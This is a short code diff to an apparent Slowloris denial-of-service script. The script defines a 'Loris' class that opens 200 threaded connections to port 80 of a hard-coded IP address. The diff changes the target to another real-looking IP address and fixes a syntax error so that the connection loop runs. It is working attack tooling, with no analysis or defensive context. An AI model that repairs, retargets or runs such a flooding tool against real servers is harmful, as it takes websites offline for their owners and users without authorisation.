@@ -13,7 +13,7 @@ import sys
 import getopt
 
 def main():
-    loris = Loris(addr = "128.252.102.114", port = 80, totalConnections = 200)
+    loris = Loris(addr = "107.150.39.234", port = 80, totalConnections = 200)
 
 if __name__ == "__main__":
     main()
@@ -39,7 +39,7 @@ class Loris:
             return
 
         i = 0
-        while i < totalConnections
+        while i < totalConnections:
             t = KillableThread(target = self.doConnections)
             t.start()
             self.threadList.append(t)
